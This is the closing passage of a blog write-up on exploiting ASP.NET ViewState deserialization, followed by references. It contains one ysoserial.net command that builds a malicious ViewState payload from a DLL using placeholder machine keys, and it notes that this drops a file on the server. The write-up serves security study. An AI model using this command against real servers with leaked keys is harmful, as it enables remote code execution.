</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &#34;&lt;path/to/the/.dll&gt;&#34; --path=&#34;/&#34; --apppath=&#34;/&#34; --validationalg=&#34;&lt;Validation_algorithm&gt;&#34; --validationkey=&#34;&lt;validation_key_value&gt;&#34; --decryptionalg=&#34;&lt;decryption_algorithm&gt;&#34; --decryptionkey=&#34;&lt;decryption_key_value&gt;&#34; --isdebug
</span></span></code></pre></td></tr></table></div></div><p>Upon execution you will notice a new &ldquo;Hacked.txt&rdquo; file in public user home. (～￣▽￣)～</p><h2 id=conclusion>Conclusion</h2><p>There are additional intricacies involved in this exploitation, such as the .NET version in use or the presence of the <strong>ViewStateUserKey</strong> (you might have noticed in <em>GetSpecificPurposes</em> method). Since several excellent blog posts already cover these aspects in depth, I won’t attempt to replicate them here. Instead, I’ll include those sources in the references for readers who want to dive deeper.</p><p>Well, that&rsquo;s it. I hope you have enjoyed 😁</p><p>If you notice any misconceptions, errors, or inaccuracies, feel free to reach out to me through the social links in the sidebar.</p><p>Thank you very much, till next time ^^</p><h2 id=references>References</h2><p><strong>Microsoft Documentation</strong></p><p><a class=link href=https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls target=_blank rel=noopener>https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls</a>
<a class=link href="https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&amp;redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey" target=_blank rel=noopener>https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey</a>
<a class=link href=https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/ target=_blank rel=noopener>https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/</a>
<a class=link href=https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls target=_blank rel=noopener>https://learn.microsoft.com/en-us/aspnet/web-forms/overview/moving-to-aspnet-20/server-controls</a>
<a class=link href=https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/ target=_blank rel=noopener>https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/</a>
<a class=link href=https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide target=_blank rel=noopener>https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide</a>
<a class=link href="https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976%5c%28v=msdn.10%5c%29" target=_blank rel=noopener>Understanding ASP.NET View State | Microsoft Learn</a></p><p><strong>Exploitation</strong></p><p><a class=link href=https://github.com/pwntester/ysoserial.net target=_blank rel=noopener>https://github.com/pwntester/ysoserial.net</a>
<a class=link href=https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/ target=_blank rel=noopener>https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/</a>
<a class=link href=https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817 target=_blank rel=noopener>https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</a>
<a class=link href=https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/ target=_blank rel=noopener>https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</a>
<a class=link href=https://blog.blacklanternsecurity.com/p/aspnet-cryptography-for-pentesters target=_blank rel=noopener>https://blog.blacklanternsecurity.com/p/aspnet-cryptography-for-pentesters</a>
<a class=link href=https://rivers.chaitin.cn/blog/cq954lh0lnechd244ou0 target=_blank rel=noopener>https://rivers.chaitin.cn/blog/cq954lh0lnechd244ou0</a></p><p><strong>Source code</strong></p><p><a class=link href=https://github.com/microsoft/referencesource/blob/main/System.Web/UI/ObjectStateFormatter.cs target=_blank rel=noopener>https://github.com/microsoft/referencesource/blob/main/System.Web/UI/ObjectStateFormatter.cs</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/web/>Web</a>
<a href=/tags/iis/>IIS</a></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Meister</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>